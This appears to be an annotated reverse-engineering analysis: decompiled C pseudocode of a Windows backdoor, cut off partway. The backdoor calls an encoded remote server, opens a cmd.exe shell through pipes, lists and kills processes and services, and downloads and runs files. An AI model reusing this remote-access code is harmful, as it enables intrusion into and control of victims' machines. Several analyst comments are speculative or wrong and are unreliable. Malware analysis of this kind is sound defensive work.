/* This file was generated by the Hex-Rays decompiler version 8.2.0.221215.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

_DWORD *__thiscall sub_40101C(_DWORD *this, char *Str, char *, char *, char *, int, int);
void __thiscall DeallocateServerParameters(int this);
BOOL __thiscall EstablishConnection_Timeouts(int this);
int __thiscall sub_4011DE(void **this, char *Str);
int __thiscall sub_40123B(void **this, char *Str);
BOOL __thiscall sub_4012C5(HINTERNET *this, LPVOID lpOptional, DWORD dwOptionalLength);
BOOL __thiscall ReadInternetFile(HINTERNET *this, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
BOOL __thiscall sub_4013A7(HINTERNET *this, char *Str);
int __thiscall CloseInternetHandles(HINTERNET *this);
int __cdecl sub_401406(char *a1, char *Str, char *Destination, char *String2); // idb
void __cdecl sub_40199F(char *Str, HANDLE hFile);
char *__cdecl sub_4019EB(char *Str);
int __cdecl sub_401A2E(char *Str, int, char); // idb
size_t __cdecl sub_401ACB(HANDLE hNamedPipe, char *ExitCode, int);
void __cdecl sub_401BA9(char *Destination, void *, HANDLE TokenHandle);
char *__cdecl sub_401E12(char *Destination);
char *__cdecl sub_402132(char *Destination);
int __stdcall StartAddress(char *lpThreadParameter);
BOOL __cdecl sub_4025A2(char *Destination, HINTERNET *, HANDLE hFile);
char *__cdecl sub_402645(char *Destination);
char *__cdecl sub_4027A8(char *Destination);
char *__cdecl sub_4027E6(char *Destination);
int __cdecl sub_402817(char *Destination, const char *, DWORD dwProcessId);
// BOOL __stdcall Process32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
// BOOL __stdcall Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
// HANDLE __stdcall CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
// void __cdecl operator delete(void *); idb
// size_t __cdecl strlen(const char *Str);
// char *__cdecl strcpy(char *Destination, const char *Source);
// void *__cdecl operator new(unsigned int); idb
// void *__cdecl memset(void *, int Val, size_t Size);
// char *__cdecl strcat(char *Destination, const char *Source);
// HRESULT __stdcall URLDownloadToFileA(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);
// BOOLEAN __stdcall GetUserNameExA(EXTENDED_NAME_FORMAT NameFormat, LPSTR lpNameBuffer, PULONG nSize);

//-------------------------------------------------------------------------
// Data declarations

// extern BOOL (__stdcall *CreateProcessAsUserA)(HANDLE hToken, LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// extern BOOL (__stdcall *EnumServicesStatusExA)(SC_HANDLE hSCManager, SC_ENUM_TYPE InfoLevel, DWORD dwServiceType, DWORD dwServiceState, LPBYTE lpServices, DWORD cbBufSize, LPDWORD pcbBytesNeeded, LPDWORD lpServicesReturned, LPDWORD lpResumeHandle, LPCSTR pszGroupName);
// extern SC_HANDLE (__stdcall *OpenSCManagerA)(LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess);
// extern SC_HANDLE (__stdcall *OpenServiceA)(SC_HANDLE hSCManager, LPCSTR lpServiceName, DWORD dwDesiredAccess);
// extern BOOL (__stdcall *GetComputerNameA)(LPSTR lpBuffer, LPDWORD nSize);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *CreateProcessA)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// extern HANDLE (__stdcall *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// extern DWORD (__stdcall *GetFileAttributesA)(LPCSTR lpFileName);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern LPSTR (__stdcall *lstrcatA)(LPSTR lpString1, LPCSTR lpString2);
// extern BOOL (__stdcall *CreatePipe)(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize);
// extern UINT (__stdcall *GetWindowsDirectoryA)(LPSTR lpBuffer, UINT uSize);
// extern BOOL (__stdcall *SetCurrentDirectoryA)(LPCSTR lpPathName);
// extern HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// extern DWORD (__stdcall *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, UINT uExitCode);
// extern DWORD (__stdcall *ExpandEnvironmentStringsA)(LPCSTR lpSrc, LPSTR lpDst, DWORD nSize);
// extern DWORD (__stdcall *GetLastError)();
// extern int (__cdecl *atol)(const char *String);
// extern char *(__cdecl *strstr)(const char *Str, const char *SubStr);
// extern int (*sprintf)(char *const Buffer, const char *const Format, ...);
// extern int (__cdecl *atoi)(const char *String);
// extern int (__cdecl *strcmpi)(const char *String1, const char *String2);
// extern BOOL (__stdcall *HttpAddRequestHeadersA)(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers);
// extern HINTERNET (__stdcall *InternetOpenA)(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags);
// extern BOOL (__stdcall *InternetReadFile)(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
char aShell[] = "shell"; // idb
char aSleepTime[] = "Sleep Time:"; // idb
char aStartShellFirs[] = "Start shell first.\r\n"; // idb
char a20111117[11] = "20111117\r\n"; // weak
char asc_4040B4[] = "\r\n"; // idb
char String1[] = "<h1>Bad Request (Invalid Hostname)</h1>"; // idb
char asc_4040E0[] = "$"; // idb
char aTasks[] = "\\tasks"; // idb
char aComputer[] = "Computer:"; // idb
char Source[] = "Accept:*/*\r\nPragma:no-cache\r\nCache-Control:max-age=0\r\nCache-Control:no-cache\r\n"; // idb
char aStartedAlready[] = "Started already,"; // idb
char asc_40420C[] = "\n"; // idb
char aCmdpath[] = "\nCmdPath="; // idb
char aCmdExe[] = "\\cmd.exe"; // idb
CHAR Src[] = "%ComSpec%"; // idb
CHAR asc_4042CC[] = ":\\"; // idb
char aVolumeOnThisCo[] = "Volume on this computer:\r\nVolume\tType\t\tVolume Name\r\n"; // idb
char aD[] = "/d"; // idb
char aListServiceFai[] = "list service failed!\r\n"; // idb
char aP[] = "/p"; // idb
char aSyntaxErrorUsa[39] = "Syntax error!\tUsage:\tlist </p|/s|/d>\r\n"; // weak
char aServiceStopped[21] = "\r\nService stopped!\r\n"; // weak
char aServiceStopPen[26] = "\r\nService stop pending!\r\n"; // weak
char aOpenserviceFai[] = "\r\nOpenService failed!\r\n"; // idb
char aOpenscmanagerF[] = "\r\nOpenSCManager failed!\r\n"; // idb
char aOk[] = "\r\nOK!\r\n"; // idb
char aSyntaxErrorUsa_0[56] = "\r\nSyntax error!\tUsage:\tkill </p|/s> <pid|ServiceName>\r\n"; // weak
char SubStr[] = "Fetch server error"; // idb
char aSoLong[] = "So long!\r\n"; // idb
char aExit[] = "exit\r\n"; // idb
char aStartserviceFa[] = "\r\nStartService failed!\r\n"; // idb
char aCreateprocessF[] = "\r\nCreateProcess failed!\r\n"; // idb
int dword_4046B4 = 120; // weak
char aMozilla40[] = "Mozilla/4.0"; // idb
char asc_4046C4[] = "/"; // idb
char byte_4046C8[152] =
{
  '\xE6',
  '\xE8',
  '\xE4',
  '\xC2',
  '\xE8',
  '\xDE',
  '\xE6',
  '\\',
  '\xDA',
  '\xC6',
  '\xC2',
  '\xCC',
  '\xCA',
  '\xCA',
  '\xE0',
  '\xC2',
  '\xF2',
  '\xD2',
  '\xDC',
  '\xCE',
  '\\',
  '\xC6',
  '\xDE',
  '\xDA',
  '\0',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  'U',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
CHAR szReferrer[8] = { '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0' }; // idb
HANDLE hObject = NULL; // idb
HANDLE dword_404774 = NULL; // idb
int dword_404778 = 0; // weak
char *String2 = NULL; // idb
LPCSTR Str = NULL; // idb
LPCSTR lpServiceName = NULL; // idb
char *String = NULL; // idb
char *dword_404794 = NULL; // idb
int openedCMD = 0; // weak
int runTillDoneFlag = 0; // weak


//----- (0040101C) --------------------------------------------------------
_DWORD *__thiscall sub_40101C(_DWORD *this, char *Str, char *a3, char *a4, char *a5, int a6, int a7)
{
  this[1] = 0;                                  // BLAKE OPIAL
                                                // wg2 pseudocode generated
  this[2] = 0;
  this[3] = 0;
  this[5] = 0;
  this[6] = 0;
  this[7] = 0;
  this[8] = 0;
  this[9] = a6;
  *this = &off_403150;
  this[4] = a7;
  sub_401199(Str);                              // a pointer to a string that specifies
                                                // the url of a certain document is passed
  sub_4011DE(a4);                               // another url pointer passed
  sub_40123B(a3);                               // pass version of Mozilla Firefox 50
  sub_401280(a5);                               // pass another reference pointer to a url document
  return this;
}
// 403150: using guessed type void *off_403150;

//----- (00401078) --------------------------------------------------------
void __thiscall sub_401078(int this)
{
  void *v2; // esi

  *this = &off_403150;
  CloseInternetHandles(this);
  if ( *(this + 24) )
    operator delete(*(this + 24));
  if ( *(this + 28) )
    operator delete(*(this + 28));
  if ( *(this + 20) )
    operator delete(*(this + 20));
  v2 = *(this + 32);
  if ( v2 )
    operator delete(v2);                        // Deallocation Function
}
// 403150: using guessed type void *off_403150;

//----- (004010C0) --------------------------------------------------------
BOOL __thiscall sub_4010C0(int this)
{
  void *v2; // eax
  DWORD v3; // ebx
  INTERNET_PORT v4; // ax
  void *v5; // eax
  HINTERNET v6; // eax
  BOOL v8; // [esp+10h] [ebp-4h]

  v2 = InternetOpenA(*(this + 28), 0, 0, 0, 0); // Function returns a handle to
                                                // use in following WinINet funcs
  *(this + 4) = v2;                             // save handle in (this + 4)
  if ( !v2 )                                    // if null, break
    return 0;
  if ( *(this + 16) )
  {
    InternetSetOptionA(v2, 5u, (this + 16), 4u);// enable sending timeouts
    InternetSetOptionA(*(this + 4), 2u, (this + 16), 4u);// sets the time needed to timeout
    v8 = InternetSetOptionA(*(this + 4), 6u, (this + 16), 4u);// allows timeouts to be recieved
  }
  if ( *(this + 36) )
  {
    v3 = -2071973632;                           // sets DW flags
    v4 = 443;                                   // port number
  }
  else
  {
    v3 = -2080374528;                           // sets DW flags
    v4 = 80;                                    // port number
                                                // 
  }
  v5 = InternetConnectA(*(this + 4), *(this + 24), v4, szReferrer, szReferrer, 3u, 0, 0);// establishes a connection
                                                // 
  *(this + 8) = v5;                             // saves the handle on the stack
  if ( !v5 )                                    // if connection failed, break
                                                // 
    return 0;
  v6 = HttpOpenRequestA(v5, szVerb, *(this + 20), 0, szReferrer, 0, v3, 0);// create an http request handle
  *(this + 12) = v6;                            // save the handle
  if ( !v6 )
    return 0;                                   // If handle failed, exit
  if ( *(this + 32) )
  {
    if ( strlen(*(this + 32)) )
      return HttpAddRequestHeadersA(*(this + 12), *(this + 32), 0xFFFFFFFF, 0x20000000u);
  }
  return v8;                                    // if failed return timeout
                                                // 
}
// 40118F: variable 'v8' is possibly undefined

//----- (00401199) --------------------------------------------------------
int __thiscall sub_401199(void **this, char *Str)
{
  size_t v4; // edi
  char *v5; // eax

  if ( !Str )                                   // if no url is specified, exit
    return 0;
  v4 = strlen(Str);                             // length of url
  if ( this[6] )                                // if ( this[6]) already exists
    operator delete(this[6]);                   // deallocate memory
  v5 = operator new(v4 + 1);                    // /memory alloc
  this[6] = v5;                                 // this + 24
  strcpy(v5, Str);                              // v5 = passed in url
  return 1;
}

//----- (004011DE) --------------------------------------------------------
int __thiscall sub_4011DE(void **this, char *Str)
{
  size_t v4; // edi
  char *v5; // eax
  _BYTE *v6; // eax

  if ( !Str )
    return 0;                                   // if url is null, break out
  v4 = strlen(Str);                             // length of url
  if ( this[5] )                                // if this[5] is already use, delete
    operator delete(this[5]);                   // deallocation
  v5 = operator new(v4 + 2);                    // allocate memory
  this[5] = v5;                                 // this + 20
  strcpy(v5, Str);
  v6 = this[5] + v4;                            // this + 20 points to a url of a document
  if ( *(v6 - 1) != 47 )                        // if the size and url link don't equal 4
  {
    *v6 = 47;
    *(this[5] + v4 + 1) = 0;
  }
  return 1;
}

//----- (0040123B) --------------------------------------------------------
int __thiscall sub_40123B(void **this, char *Str)
{
  size_t v4; // edi
  char *v5; // eax

  if ( !Str )                                   // if passed in version number is invalid, break
    return 0;
  v4 = strlen(Str);                             // length of firefox version
  if ( this[7] )                                // if this[7] exists, delete it
    operator delete(this[7]);
  v5 = operator new(v4 + 1);                    // allocate new memory
  this[7] = v5;                                 // this + 28
  strcpy(v5, Str);                              // this + 28 points to mozilla version
  return 1;
}

//----- (00401280) --------------------------------------------------------
int __thiscall sub_401280(void **this, char *Str)
{
  size_t v4; // edi
  char *v5; // eax

  if ( !Str )                                   // if passed in pointer is null, break
    return 0;
  v4 = strlen(Str);
  if ( this[8] )
    operator delete(this[8]);
  v5 = operator new(v4 + 1);
  this[8] = v5;                                 // this + 32
  strcpy(v5, Str);                              // this + 32 references a url pointer
  return 1;
}

//----- (004012C5) --------------------------------------------------------
BOOL __thiscall sub_4012C5(HINTERNET *this, LPVOID lpOptional, DWORD dwOptionalLength)
{
  char Buffer[64]; // [esp+4h] [ebp-4Ch] BYREF
  DWORD dwBufferLength; // [esp+44h] [ebp-Ch] BYREF
  BOOL v7; // [esp+48h] [ebp-8h]
  char bufferPointer; // [esp+4Ch] [ebp-4h] BYREF
  char v9_instance_in_sub4012c5; // [esp+4Dh] [ebp-3h]

  if ( !this[3] )                               // if there's no http request handle. break
    return 0;
  do
  {
    sprintf(Buffer, "Content-Length: %d\r\n", dwOptionalLength);// number of bytes read is outputted
    HttpAddRequestHeadersA(this[3], Buffer, 0xFFFFFFFF, 0xA0000000);// add request headers to HTTP handle
    v7 = HttpSendRequestA(this[3], 0, 0, lpOptional, dwOptionalLength);// send a request to the specified server
    if ( v7 )                                   // was it successful? then break
      break;
    if ( GetLastError() != 12045 )              // if there's no error with 
                                                // Certificate Authority, break
      break;
    dwBufferLength = 4;
    InternetQueryOptionA(this[3], 0x1Fu, &bufferPointer, &dwBufferLength);// retrueve the security options of the handle
    v9_instance_in_sub4012c5 |= 1u;
  }
  while ( InternetSetOptionA(this[3], 0x1Fu, &bufferPointer, 4u) );// certain security options stay set on connection
  return v7;
}

//----- (0040138F) --------------------------------------------------------
BOOL __thiscall sub_40138F(
        HINTERNET *this,
        LPVOID lpBuffer,
        DWORD dwNumberOfBytesToRead,
        LPDWORD lpdwNumberOfBytesRead)
{
  return InternetReadFile(this[3], lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead);// 
                                                // read data from the handle
}

//----- (004013A7) --------------------------------------------------------
BOOL __thiscall sub_4013A7(HINTERNET *this, char *Str)
{
  DWORD v4; // eax

  if ( !Str )
    return 0;                                   // return if string is invalid
  v4 = strlen(Str);                             // save the length of str
  return sub_4012C5(this, Str, v4);
}

//----- (004013CC) --------------------------------------------------------
int __thiscall sub_4013CC(HINTERNET *this)
{
  if ( this[3] )
  {
    InternetCloseHandle(this[3]);
    this[3] = 0;
  }
  if ( this[2] )
  {
    InternetCloseHandle(this[2]);
    this[2] = 0;
  }
  if ( this[1] )
  {
    InternetCloseHandle(this[1]);
    this[1] = 0;
  }
  return 1;
}

//----- (00401406) --------------------------------------------------------
int __cdecl sub_401406(char *a1, char *Str, char *Destination, char *String2)
{
  unsigned int v4; // edi
  char *v5; // eax
  char *v6; // esi
  char *v7; // eax
  size_t v8; // eax
  DWORD v9; // esi
  unsigned int v10; // edi
  char *v11; // esi
  int v12; // edi
  const char *v13; // esi
  HANDLE Thread; // esi
  int v15; // eax
  unsigned int v17; // [esp+0h] [ebp-290h]
  CHAR NameBuffer[260]; // [esp+10h] [ebp-280h] BYREF
  CHAR Buffer[264]; // [esp+114h] [ebp-17Ch] BYREF
  struct _SECURITY_ATTRIBUTES v20; // [esp+21Ch] [ebp-74h] BYREF
  struct _SECURITY_ATTRIBUTES PipeAttributes; // [esp+228h] [ebp-68h] BYREF
  int v22[10]; // [esp+234h] [ebp-5Ch] BYREF
  char *v23; // [esp+25Ch] [ebp-34h]
  int v24; // [esp+260h] [ebp-30h]
  HANDLE hReadPipe; // [esp+264h] [ebp-2Ch] BYREF
  int v26; // [esp+268h] [ebp-28h]
  HANDLE hWritePipe; // [esp+26Ch] [ebp-24h] BYREF
  HANDLE hObject; // [esp+270h] [ebp-20h] BYREF
  char *computerName; // [esp+274h] [ebp-1Ch]
  HANDLE hFile; // [esp+278h] [ebp-18h] BYREF
  DWORD nSize; // [esp+27Ch] [ebp-14h] BYREF
  DWORD dwNumberOfBytesRead; // [esp+280h] [ebp-10h] BYREF
  int v33; // [esp+28Ch] [ebp-4h]

  v4 = 0;
  v24 = 0;
  v26 = 0;
  openedCMD = 0;
  if ( a1 )
  {
    if ( Str )                                  // if previous call found a computer name
    {
      v5 = operator new(0x400u);
      v6 = v5;
      v23 = v5;
      if ( v5 )
      {
        strcpy(v5, Source);                     // copy http header information
        strcat(v6, aComputer);                  // add 'Computer:' to the previous source field
        nSize = 16;
        computerName = &v6[strlen(v6)];         // v29 equals to the space after 'Computer:'
        GetComputerNameA(computerName, &nSize); // grabs the NetBIOS name established a startup
        sub_40101C(v22, a1, Str, Destination, v6, String2, 3600000);// memory Allocation for these parameters
                                                // a1 equals allocated memory,
                                                // Str is a buffer,
                                                // Destination is a return buffer,
                                                // v6 is allocated memory,
                                                // String2 currently = 1
        v33 = 0;
        do
        {
          if ( EstablishConnection_Timeouts(v22) )// attempt to connect to server,
                                                // break on success
            break;
          CloseInternetHandles(v22);            // close all handles on failure
          ++v4;                                 // attempt counter increments
          Sleep(0xEA60u);                       // sleep for a while before trying again.
        }
        while ( v4 < 5 );
        if ( v4 != 5 )                          // if attempt counter was never maxed out,
                                                // then we established contact!
                                                // Continue on
        {
          Str = operator new(0x10000u);
          v7 = operator new(0x1000u);           // allocate memory
          String2 = v7;                         // v7 equals memory location
          if ( Str )
          {
            if ( v7 )                           // if both variables exist, do this.
            {
              Destination = operator new(0x200u);// allocate memory for destination
              if ( Destination )                // if allocated, do this
              {
                PipeAttributes.nLength = 12;
                PipeAttributes.bInheritHandle = 1;
                PipeAttributes.lpSecurityDescriptor = 0;// establish pipe attributes for connections
                if ( CreatePipe(&hReadPipe, &hWritePipe, &PipeAttributes, 0) )// if pipe created, do this
                {
                  v20.nLength = 12;
                  v20.bInheritHandle = 1;
                  v20.lpSecurityDescriptor = 0; // pipe attributes for a second pipeline,
                                                // same as the first pipe
                  if ( CreatePipe(&hObject, &hFile, &v20, 0) )// if created, perform this
                  {
                    GetWindowsDirectoryA(Buffer, 0x104u);// gets the current windows directory
                    strcat(Buffer, aTasks);     // append 'aTasks' to the current directory
                    SetCurrentDirectoryA(Buffer);// go to the newly appended directory
                    sprintf(Str, "\r\n%s Connected!\r\n", computerName);// prints 'computerName Connected!'
                    v8 = strlen(Str);           // v8 equals the length of the character array used
LABEL_14:
                    v9 = v8;                    // v9 = v8
                    while ( 1 )
                    {
                      v10 = 0;
                      if ( openedCMD && !v9 )
                      {
                        v17 = v24;              // v17 = 0
                        *Str = 0;               // char array equals 0
                        v9 = sub_401ACB(hReadPipe, Str, v17);// v9 equals 23
                      }
                      if ( !v26 && !openedCMD && !v9 )
                      {
                        strcpy(Str, asc_4040E0);// copy '$'
                        v9 = strlen(Str);       // v9 = 1
                        v26 = 1;
                      }
                      do
                      {
                        if ( sub_4012C5(v22, Str, v9) )// if http request was successful, break
                          break;
                        ++v10;                  // increment attempt counter
                        Sleep(0x7530u);         // sleep for a while
                      }
                      while ( v10 <= 5 );       // tryat most 5 times
                      if ( v10 > 5 )            // if attempts exceeded max, break
                        break;
                      v9 = 0;
                      memset(String2, 0, 0x1000u);// fill String2 with 0's
                      if ( ReadInternetFile(v22, String2, 0x1000u, &dwNumberOfBytesRead) )// if reading from file is succesful, do this
                      {
                        do
                          v9 += dwNumberOfBytesRead;// v9 = number to read
                        while ( dwNumberOfBytesRead
                             && ReadInternetFile(v22, &String2[v9], 0x1000u, &dwNumberOfBytesRead) );// /
                                                // while theres bytes to read and a connection
                        if ( v9 )
                        {
                          if ( strcmpi(String1, String2) )// compare two strings
                          {
                            v11 = String2;
                            v26 = 0;
                            v24 = 1;
                            *Str = 0;
                            while ( 1 )
                            {
                              computerName = sub_4019EB(v11);// assign computername to specific name from the file
                              strcpy(Destination, v11);// destination = to the data from internetreadfile
                              if ( *v11 )       // if v11 first character isn't 0, break
                                break;
                              if ( openedCMD )
                              {
                                v12 = -1;       // trigger flag variable
                                goto LABEL_39;
                              }
LABEL_52:
                              if ( !*computerName )// if computername is invalid, try again
                              {
                                v8 = strlen(Str);
                                goto LABEL_14;  // repeat until a valid name is given
                              }
                              v11 = computerName;// v11 = current computer name
                            }
                            v12 = 0;
                            sub_401A2E(v11, 0, 32);
                            v13 = aShell;       // load v13 with string 'shell'
                            do
                            {
                              if ( !strcmpi(v13, ::String2) )// if the global string value is 'shell' then
                                                // skip ahead
                                break;          // if the two strings aren't the same, exit while-loop
                              v13 += 8;         // test failed, increment by 8 bytes
                              ++v12;            // increment v12
                            }
                            while ( v13 < aSleepTime );// repeat until worked more than you've slept
LABEL_39:
                            switch ( v12 )      // how many times, did the while-loop run?
                            {
                              case 0:
                                sub_401BA9(Str, hObject, hWritePipe);// create a shell
                                goto LABEL_52;  // repeat
                              case 1:
                                sub_401E12(Str);// get info on every current process that is 
                                                // running
                                goto LABEL_52;  // repeat
                              case 2:
                                sub_402132(Str);// stop processes
                                goto LABEL_52;
                              case 3:           // empty case? guess they never reach 3
                              case 4:
                                dword_404794 = a1;// character value? not 0
                                Thread = CreateThread(0, 0, StartAddress, Str, 0, 0);// thread created for StartAddress subroutine
                                                // will create a file using another file from a 
                                                // unknown server as the data source
                                WaitForSingleObject(Thread, 0xFFFFFFFF);// wait the maximum amount of time for a valid response
                                                // this thread
                                CloseHandle(Thread);// we're finished with this handle, so we
                                                // can close it now
                                goto LABEL_52;  // repeat
                              case 5:
                                sub_402645(Str);// start running a service as an administrator
                                goto LABEL_52;
                              case 6:
                                nSize = 257;
                                GetUserNameExA(NameSamCompatible, NameBuffer, &nSize);// grabs current users name and saves it
                                                // in NameBuffer
                                                // (it's specified by NameSamCompatible
                                                // which will return the entire
                                                // field using '\')
                                strcat(Str, NameBuffer);// append that to the Str 
                                strcat(Str, asc_4040B4);// append a carriage return, and new line character
                                goto LABEL_52;
                              case 7:
                                sub_4013A7(v22, aSleepTime);// make a HTTP service request
                                do
                                {
                                  sub_4013A7(v22, szReferrer);// make http request and recieve file
                                  ReadInternetFile(v22, String2, 0x1000u, &dwNumberOfBytesRead);// reads file and saves it content in lpBuffer
                                }
                                while ( !dwNumberOfBytesRead );// while there were no bytes read
                                String2[dwNumberOfBytesRead] = 0;// last index place becomes 0
                                v15 = atoi(String2);// convert string2 into an integer
                                nSize = v15;    // save it as the size
                                if ( v15 )      // if v15 equals a valid number
                                  dword_4046B4 = v15;// save it in this double word
                                sub_4025A2(Str, v22, hFile);// 
                                                // exit loop
                                break;
                              case 8:
                                strcat(Str, a20111117);// append '2011117'
                                                // 
                                goto LABEL_52;
                              case 9:
                                sub_4027A8(Str);// run a process specified in lpServiceName
                                goto LABEL_52;
                              case 10:
                                sub_4027E6(Str);// download bits from the internet and save them
                                                // to an appropriate file
                                goto LABEL_52;
                              default:
                                if ( openedCMD )// if a command line was open
                                {
                                  strcat(Destination, asc_4040B4);// create new line and carriage return
                                  sub_40199F(Destination, hFile);// write to a file
                                  v24 = 1;      // trigger flag variable
                                }
                                else
                                {
                                  strcat(Str, aStartShellFirs);// append 'Start Shell First'
                                }
                                goto LABEL_52;  // repeat
                            }
                          }
                          break;
                        }
                      }
                    }
                  }
                }
                v6 = v23;
              }
            }
          }
        }
        if ( openedCMD )                        // if a command line was opened
        {
          TerminateProcess(::hObject, 0);       // terminate the global pipe
          WaitForSingleObject(::hObject, 0xFFFFFFFF);// wait until termination is complete
        }
        CloseInternetHandles(v22);              // Clean Up
        if ( Str )
          operator delete(Str);                 // deallocate
        if ( String2 )
          operator delete(String2);             // deallocate
        operator delete(v6);
        if ( Destination )                      // deallocate buffer
          operator delete(Destination);
        CloseHandle(::hObject);                 // close the pipe handle
        CloseHandle(dword_404774);              // close process handle
        if ( hReadPipe != -1 )
          CloseHandle(hReadPipe);
        if ( hWritePipe != -1 )
          CloseHandle(hWritePipe);
        if ( hObject != -1 )
          CloseHandle(hObject);
        if ( hFile != -1 )
          CloseHandle(hFile);                   // Clean Up
        v33 = -1;
        DeallocateServerParameters(v22);        // deallocate 
      }
    }
  }
  return 0;
}
// 4046B4: using guessed type int dword_4046B4;
// 4047A0: using guessed type int openedCMD;

//----- (0040199F) --------------------------------------------------------
void __cdecl sub_40199F(char *Str, HANDLE hFile)
{
  char *v2; // esi
  DWORD v3; // eax
  bool v4; // al

  v2 = Str;
  if ( Str )
  {
    if ( strlen(Str) )
    {
      v3 = strlen(Str);
      Str = 0;
      v4 = WriteFile(hFile, v2, v3, &Str, 0);   // a handle to the file being written to,
                                                // the buffer containing what to write,
                                                // the length,
                                                // number already written
      if ( Str )                                // if str is valid
      {
        if ( v4 )                               // if write is successful
          Sleep(0x64u);                         // wait for a while
      }
    }
  }
}

//----- (004019EB) --------------------------------------------------------
char *__cdecl sub_4019EB(char *Str)
{
  size_t v2; // esi
  size_t v3; // eax
  char v4; // cl

  if ( !Str )                                   // break if null
    return 0;
  v2 = 0;
  v3 = strlen(Str);
  if ( v3 )
  {
    do
    {
      v4 = Str[v2];
      if ( !v4 )
        break;
      if ( v4 == 13 )
        break;
      if ( v4 == 10 )                           // checking version number?
        break;
      ++v2;
    }
    while ( v2 < v3 );
  }
  if ( Str[v2] == 13 )
  {
    Str[v2] = 0;
    v2 += 2;
  }
  return &Str[v2];
}

//----- (00401A2E) --------------------------------------------------------
int __cdecl sub_401A2E(char *Str, int a2, char a3)
{
  size_t v3; // eax
  int v4; // esi
  char v5; // bl
  int *v6; // edx
  char v7; // cl
  char *v8; // eax
  int v10; // [esp+Ch] [ebp-8h]
  int v11; // [esp+10h] [ebp-4h]
  unsigned int v12; // [esp+20h] [ebp+Ch]

  v3 = a2;                                      // v3 - 0
  v4 = 0;
  v10 = 0;
  v11 = 0;
  if ( !a2 )                                    // if a2 was 0, do this
    v3 = strlen(Str);                           // v3 = computer name length
  v5 = a3;                                      // 32
  v12 = v3;                                     // v12 = computer name length = v3
  v6 = &String2;                                // v6 equals string2
  memset(&String2, 0, 0x20u);                   // replace string2 with 0's
  if ( !v3 )                                    // valid computer name length?
    return v10 + 1;                             // if failed, return 1
  while ( 1 )
  {
    v7 = Str[v4];                               // v7 = stored value
    v8 = &Str[v4];                              // v8 = address
    if ( v7 != v5 && !v11 )                     // if v7 != 32 and v11 == 0
    {
      v11 = 1;                                  // adjust v11
      if ( v7 == 34 )                           // does v7(Str[v4]) = 34??
      {
        v5 = 34;                                // yes? adjust v5 = 34
        ++v4;                                   // increment index
      }
      v8 = &Str[v4];                            // update stored address
      *v6 = &Str[v4];                           // store the same address in pointer variable
                                                // v6
    }
    if ( *v8 == v5 || *v8 == 13 )               // if v8 dereferenced = 32 or 13 do this
    {
      if ( v11 )                                // if v11 flag was triggered, do this
      {
        v11 = 0;                                // reset the flag
        *v8 = 0;                                // adjust the value stored at v8
        ++v10;                                  // increment v10
